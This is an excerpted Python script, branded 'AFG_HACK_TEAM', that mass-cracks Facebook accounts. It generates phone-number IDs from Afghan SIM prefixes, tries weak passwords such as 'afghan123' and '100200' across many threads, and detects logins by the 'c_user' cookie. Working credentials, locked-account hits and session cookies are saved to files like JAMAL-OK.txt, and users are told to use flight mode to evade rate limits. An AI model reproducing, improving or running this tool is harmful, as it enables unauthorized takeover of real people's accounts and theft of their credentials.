...
\033[1;34m--------------------------------------------------
\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33mSAYED JAMAL 
\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32ERROR
\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33mSAYED JAMAL 
\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34mAFG_HACK_TEAM
\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92mSAYED JAMAL( FREE )
\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m0.1

tap here to open My facebook: https://www.facebook.com/sayedjamal.afg
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('clear')
				print(logo)
				print(' Example : 100200,500600,700800,10002000,afghan123,kabul123***Etc')
				linex()
				...
				with tred(max_workers=25) as crack_submit:
					...
					print(' \x1b[1;91mIf  no result use flight mode for 5 second ')
					linex()
					for user in fo:
				...
				os.system('xdg-open https://https://www.facebook.com/noorullah.karokhail?mibextid=ZbWKwL');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mJAMAL\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[JAMAK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/JAMAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[JAMAL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/JAMAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[JAMAL-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/JAMAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[JAMAL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/JAMALCP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE 9378,9379,9377,9374.ETC')
	linex()
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		print('\x1b[1;91m If no result use flight mode for 5 second ')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def random_number2():
	...
	print('[√] EXAMPLE 9378,9379,9377,9374.ETC')
	linex()
	kode = input('[+]93[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	linex()
	print(' Example : 1000,5000,10000,****Etc')
...
def random_number4():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE 9378,9379,9377,9374,9370.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'100200','300400','500600','afghan123']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example :100200 ,300400,600700,afghan123,kabul123***Etc')
    linex()
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\x1b[1;91m  _ If you no result use flight mode .')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
		...
		for ps in pwx:
         ...
         # 'cookie': 'datr=VHlfZBJ1WRSBYiQwVFsmEur6; sb=VHlfZLpo57iAFgE48SpPjIS9',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[MR,JAMAL-OK] '+cid+' | '+ps+'\033[1;32m')
				open('MR_JAMAL-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[JAMAL-CP] '+cid+' | '+ps+'\33[0;97m')
				open('JAMAL-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
